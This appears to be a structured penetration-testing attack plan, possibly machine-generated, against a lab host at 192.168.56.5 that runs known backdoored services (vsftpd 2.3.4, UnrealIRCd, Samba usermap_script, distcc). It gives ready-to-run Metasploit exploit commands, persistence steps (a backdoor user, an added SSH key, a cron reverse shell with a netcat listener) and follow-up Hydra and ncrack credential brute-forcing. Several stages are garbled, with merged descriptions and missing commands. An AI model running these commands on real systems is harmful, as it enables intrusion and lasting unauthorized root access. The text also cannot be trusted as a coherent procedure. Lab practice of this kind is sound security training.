summary: vsftpd 2.3.4 backdoor on port 21 (CVE-2011-2523, high risk exploit)
ProFTPD 1.3.1 backdoor on port 2121 (high risk backdoor)
Samba smbd 3.X-4.X on ports 139/445 (CVE-2007-2447, usermap_script exploit)
UnrealIRCd on port 6667 (CVE-2010-2075 backdoor, high risk)
Distcc bindshell on port 1524 (CVE-2004-2687, high risk exploit)
Apache Tomcat on port 8180 (CVE-2009-0580, manager upload exploit)

stages.description: Exploit vsftpd 2.3.4 backdoor to gain root shell via Metasploit.
commands: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'
verification: Check for successful shell prompt in Metasploit output (e.g., 'Meterpreter session opened')

stages.description: Backdoor provides direct root access; no further escalation needed, verify root privileges.
commands: id (run in the shell to confirm root)

stages.description: Create a backdoor user for persistent access.
Exploit Samba CVE-2007-2447 to execute command as root and spawn shell.
verification: Look for 'Command shell session opened' in Metasploit

stages.description: Exploit provides root shell; verify privileges.
Add SSH key for persistent root access.
Trigger UnrealIRCd backdoor (CVE-2010-2075) for root shell.
commands: msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.5; set RPORT 6667; run'
verification: Meterpreter or shell session in Metasploit output

stages.description: Direct root access from backdoor; confirm.
verification: User is root, no additional escalation required

stages.description: Install cron job for reverse shell persistence.
verification: nc -lvnp 4444 (listener on attacker machine, check for incoming shell every minute)

followup_requests: Run full Nikto scan on port 80: nikto -h http://192.168.56.5 -o nikto80.txt
Enumerate SMB shares and users: smbclient -L //192.168.56.5 -N; enum4linux -a 192.168.56.5
Brute-force SSH credentials: hydra -l msfadmin -p msfadmin ssh://192.168.56.5
Detailed MySQL enumeration: mysql -h 192.168.56.5 -u root -p'' -e 'SHOW DATABASES;'
VNC password guessing: ncrack -p 5900 192.168.56.5 -U vnc_users.txt -P vnc_passwords.txt
